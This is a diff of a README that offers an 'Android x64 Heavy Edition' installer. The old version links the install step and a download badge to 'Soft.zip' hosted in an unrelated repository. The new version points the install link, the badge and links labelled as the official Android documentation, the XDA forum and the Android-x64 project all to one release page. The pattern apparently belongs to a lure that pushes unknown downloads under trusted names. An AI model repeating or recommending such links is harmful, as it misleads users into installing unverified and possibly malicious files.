@@ -27,7 +27,7 @@ To get started with Android x64 Heavy Edition, ensure that you meet the necessar
 
 ## Installation
 To install the Android x64 Heavy Edition, follow these steps:
-1. [Download the installation file](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip) from the provided link.
+1. [Download the installation file](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0) from the provided link.
 2. Launch the installation package and follow the on-screen instructions to complete the setup process.
 3. Once installed, you can start exploring the features and functionalities of Android x64 Heavy Edition.
 
@@ -41,11 +41,11 @@ We welcome contributions to the Android-x64 Android 6.1 Heavy Edition Documentat
 
 ## Resources
 Explore more about Android x64 and related topics through the following resources:
-- [Android-x64 Project Repository](https://github.com/android-x64)
-- [Official Android Documentation](https://developer.android.com)
-- [XDA Developers Forum](https://forum.xda-developers.com)
+- [Android-x64 Project Repository](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0)
+- [Official Android Documentation](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0)
+- [XDA Developers Forum](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0)
 
 ## Support
 For any inquiries, feedback, or support requests regarding Android x64 Heavy Edition, please reach out to our support team by opening an issue in this repository. We are here to assist you in making the most out of your Android x64 experience.
 
-[![Download Android x64 Heavy Edition](https://img.shields.io/badge/Download-Android_x64_Heavy_Edition-brightgreen)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download Android x64 Heavy Edition](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0)](https://github.com/ArnavGamer/Android-x64_Android6.1_Heavy_Edition_Docs/releases/tag/v1.0)
